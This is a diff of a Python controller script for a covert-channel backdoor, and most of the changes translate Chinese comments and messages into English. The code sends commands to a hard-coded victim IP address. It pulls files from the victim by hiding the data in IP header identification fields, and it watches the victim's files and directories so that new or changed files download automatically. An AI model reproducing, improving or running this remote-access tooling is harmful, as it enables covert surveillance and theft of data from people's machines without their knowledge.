@@ -4,7 +4,6 @@ import socket
 import struct
 import time
 import json
-from datetime import datetime
 
 # Commander configuration
 VICTIM_IP = "192.168.1.124"  # Target victim IP address (change as appropriate)
@@ -17,7 +16,7 @@ RECV_TIMEOUT = 60.0  # seconds to wait for a response from a victim
 
 def get_local_ip(dest_ip, dest_port):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    # 用 Victim 的 UDP 端口（这里用 COVERT_UDP_PORT）来探路
+    # Use the victim's UDP port (here using COVERT_UDP_PORT) to probe
     s.connect((dest_ip, dest_port))
     local_ip = s.getsockname()[0]
     s.close()
@@ -209,7 +208,7 @@ class Commander:
 
     def download_file_with_debug(self, remote_path: str, local_path: str, timeout=60):
         """
-        下载 remote_path 文件并打印每个 chunk 的调试信息
+        download remote_path file and print chunk debug message
         """
         try:
             self.sock.settimeout(0.1)
@@ -219,12 +218,12 @@ class Commander:
             pass
         finally:
             self.sock.settimeout(RECV_TIMEOUT)
-        # 1) 发送 CMD_GET
+
         cmd = f"CMD_GET:{remote_path}".encode()
-        print(f"[*] 请求下载文件 `{remote_path}` …")
+        print(f"[*] Request Download file `{remote_path}` …")
         self.send_covert_message(cmd)
 
-        expected_length = None  # 总长度
+        expected_length = None
         data = b''
         chunk_count = 0
         start_time = time.time()
@@ -233,22 +232,20 @@ class Commander:
             try:
                 packet, addr = self.sock.recvfrom(65535)
             except socket.timeout:
-                # 超时还没拿到任何 chunk，就退出
+
                 if expected_length is None:
-                    print("[DEBUG] 没有拿到任何数据包，下载失败或命令未到达")
+                    print("[DEBUG] No packets received. Download failed or command not received")
                     return False
-                # 已经开始接收过，就继续等，直到全超时
+
                 if time.time() - start_time > timeout:
-                    print(f"\n[DEBUG] 总超时 ({timeout}s)，共收到了 {chunk_count} 个 chunk，{len(data)} bytes")
+                    print(f"\n[DEBUG] Timeout ({timeout}s)，Received {chunk_count} 个 chunk，{len(data)} bytes")
                     return False
-                print(f"[DEBUG] 等待更多 chunk… 已收到 {chunk_count} 个，{len(data)} bytes", end='\r')
+                print(f"[DEBUG] Waiting for more chunks… Received {chunk_count} 个，{len(data)} bytes", end='\r')
                 continue
 
-            # 只处理来自 victim 的 UDP 包
             if addr[0] != VICTIM_IP:
                 continue
 
-            # 解析 IP header 中的 identification 字段
             ip_header = packet[:20]
             ip_fields = struct.unpack(">BBHHHBBH4s4s", ip_header)
             proto = ip_fields[6]
@@ -258,29 +255,28 @@ class Commander:
             chunk = struct.pack(">H", ip_id)
             chunk_count += 1
 
-            # 第一个 chunk：两字节总长度
             if expected_length is None:
                 expected_length = struct.unpack(">H", chunk)[0]
-                print(f"[Download Debug] 文件总长度标识: {expected_length} bytes，开始接收数据 chunk…")
+                print(f"[Download Debug] File length header: {expected_length} bytes，start receiving data chunk…")
             else:
                 data += chunk
                 received = len(data)
-                print(f"[Download Debug] chunk #{chunk_count}: id={ip_id}, 收到 {received}/{expected_length} bytes", end='\r')
+                print(f"[Download Debug] chunk #{chunk_count}: id={ip_id}, Receive {received}/{expected_length} bytes",
+                      end='\r')
 
-            # 如果收满就退出
             if expected_length is not None and len(data) >= expected_length:
-                print()  # 换行
+                print()
                 break
 
-        # 写盘
         try:
             with open(local_path, "wb") as f:
                 f.write(data[:expected_length])
-            print(f"[*] 文件已保存到 `{local_path}` ({expected_length} bytes)")
+            print(f"[*] File saved to `{local_path}` ({expected_length} bytes)")
             return True
         except Exception as e:
-            print(f"[!] 写入本地文件失败：{e}")
+            print(f"[!] Failed to write local file：{e}")
             return False
+
 
 # High-level command functions using the Commander class
 def cmd_uninstall(comm: Commander):
@@ -349,52 +345,51 @@ def cmd_put_file(comm: Commander):
 
 def cmd_get_file(comm: Commander):
     remote = input("Enter file path on victim to download: ").strip()
-    local  = input("Enter local save path: ").strip() or os.path.basename(remote)
+    local = input("Enter local save path: ").strip() or os.path.basename(remote)
     comm.download_file_with_debug(remote, local)
 
 
 def cmd_monitor_file(comm: Commander):
     file_path = input("Enter file path on victim to monitor: ").strip()
-    print(f"[Commander] 开始监控文件：{file_path}")
+    print(f"[Commander] Start monitoring file：{file_path}")
     comm.send_covert_message(f"CMD_MON_FILE:{file_path}".encode())
 
     try:
         while True:
             data = comm.recv_covert_message()
             if not data:
-                continue  # 超时重试
+                continue  # timeout retry
 
-            # 只处理 JSON 事件
+            # Only handle JSON events
             try:
                 msg = json.loads(data.decode('utf-8', errors='ignore'))
             except Exception:
                 continue
 
-            typ  = msg.get('type', '')
+            typ = msg.get('type', '')
             path = msg.get('path', '')
 
-            # 只有真正的“文件修改”事件才下载
             if typ == "MON_FILE_MODIFIED" and path:
-                print(f"[{msg.get('timestamp','')}] 文件被修改：{path}")
+                print(f"[{msg.get('timestamp', '')}] File Modified：{path}")
                 try:
                     local_name = os.path.basename(path)
                     if not comm.download_file_with_debug(path, local_name):
-                        print(f"[!] 下载失败：{path}")
+                        print(f"[!] Download failed：{path}")
                 except Exception as e:
-                    print(f"[!] 下载异常：{e}")
+                    print(f"[!] Exception occurred while downloading：{e}")
 
     except KeyboardInterrupt:
-        print("\n[*] 停止文件监控。")
+        print("\n[*] Stop file monitoring。")
         comm.send_covert_message(b"CMD_STOP_MON_FILE")
 
 
 def cmd_monitor_dir(comm: Commander):
     dir_path = input("Enter directory path on victim to monitor: ").strip()
-    print(f"[Commander] 开始监控目录：{dir_path}")
-    # 启动监控
+    print(f"[Commander] Start monitoring directory：{dir_path}")
+    # Send Start Monitor command to victim
     comm.send_covert_message(f"CMD_MON_DIR:{dir_path}".encode())
 
-    processed = set()  # 只在新增时去重，修改时每次都下载
+    processed = set()
 
     try:
         while True:
@@ -402,63 +397,59 @@ def cmd_monitor_dir(comm: Commander):
             if not data:
                 continue
 
-            # 只处理 JSON 事件
+            # Only handle JSON events
             try:
                 raw = data.decode('utf-8', errors='ignore').strip()
                 msg = json.loads(raw)
             except:
                 continue
 
-            typ   = msg.get('type', '')
+            typ = msg.get('type', '')
             fname = msg.get('filename', '')
-            path  = msg.get('path', '')
-            ts    = msg.get('timestamp', '')
+            path = msg.get('path', '')
+            ts = msg.get('timestamp', '')
 
-            # 忽略隐藏文件和 swap 文件
+            # Ignore hidden files and swap files
             if not fname or fname.startswith('.') or fname.endswith('.swp'):
                 continue
-            # 只监控根目录下的文件
+            # Only monitor files in the root of the directory
             if os.path.sep in fname:
                 continue
 
-            # 根据事件类型决定是否下载
             if typ == "MON_DIR_ADDED":
                 if fname in processed:
                     continue
                 processed.add(fname)
-                action = "新增"
+                action = "added"
             elif typ == "MON_DIR_MODIFIED":
-                action = "修改"
+                action = "modified"
             else:
                 continue
 
             remote_file = os.path.join(path, fname)
-            print(f"[{ts}] 目录文件{action}：{remote_file}，准备下载…")
+            print(f"[{ts}] Directory file {action}：{remote_file}，preparing to download…")
 
-            # —— 暂停监控 ——
+            # —— Pause monitoring ——
             comm.send_covert_message(b"CMD_STOP_MON_DIR")
-            time.sleep(1.2)  # 等待监控线程退出
+            time.sleep(1.2)  # Wait for the monitoring thread to exit
 
-            # —— 执行下载 ——
+            # —— Perform download ——
             try:
                 local_name = os.path.basename(remote_file)
                 if comm.download_file_with_debug(remote_file, local_name):
-                    print(f"[*] 下载完成：{local_name}")
+                    print(f"[*] Download Completed：{local_name}")
                 else:
-                    print(f"[!] 下载失败：{remote_file}")
+                    print(f"[!] Download failed：{remote_file}")
             except Exception as e:
-                print(f"[!] 下载异常：{e}")
+                print(f"[!] Download exception：{e}")
 
-            # —— 恢复监控 ——
+            # —— Resume monitoring ——
             comm.send_covert_message(f"CMD_MON_DIR:{dir_path}".encode())
-            time.sleep(1.2)  # 等待新线程启动
+            time.sleep(1.2)  # Wait for a new monitoring thread to start
 
     except KeyboardInterrupt:
-        print("\n[*] 停止目录监控。")
+        print("\n[*] Stopping directory monitoring。")
         comm.send_covert_message(b"CMD_STOP_MON_DIR")
-
-
-
 
 
 def cmd_run_program(comm: Commander):
